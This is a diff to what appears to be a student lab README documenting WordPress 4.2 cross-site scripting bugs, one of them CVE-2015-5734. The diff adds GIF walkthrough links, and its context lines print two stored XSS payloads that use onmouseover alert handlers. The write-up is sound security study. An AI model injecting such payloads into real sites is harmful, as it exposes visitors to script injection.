@@ -22,7 +22,7 @@ Time spent: **5** hours spent in total
     - Vulnerability types:Cross-Site Scripting (XSS)
     - Tested in version:4.2
     - Fixed in version: 4.2.3
-  - [x] GIF Walkthrough: 
+  - [x] GIF Walkthrough: ![XSS2](https://user-images.githubusercontent.com/25422131/55770524-a1ce9800-5a52-11e9-908d-7682e82e9755.gif)
   - [x] Steps to recreate: Make a post and in the body of the post enter the following:
   
   `<a href="[caption code=">]</a><a title=" onmouseover=alert('Exploit2!') ">here</a>`
@@ -35,7 +35,8 @@ Time spent: **5** hours spent in total
     - Vulnerability types:CVE-2015-5734
     - Tested in version: 4.2
     - Fixed in version: 4.2.4
-  - [x] GIF Walkthrough: 
+  - [x] GIF Walkthrough: ![XSS3](https://user-images.githubusercontent.com/25422131/55770542-b0b54a80-5a52-11e9-94ac-f26a8379cad5.gif)
+  
   - [x] Steps to recreate: Make a post and type the following as a reply:
   
   `<a href='/wp-admin/' title="" style="position:absolute;top:0;width:10%;height:100%;display:block;" onmouseover=alert(3)//'>TEST</a>`
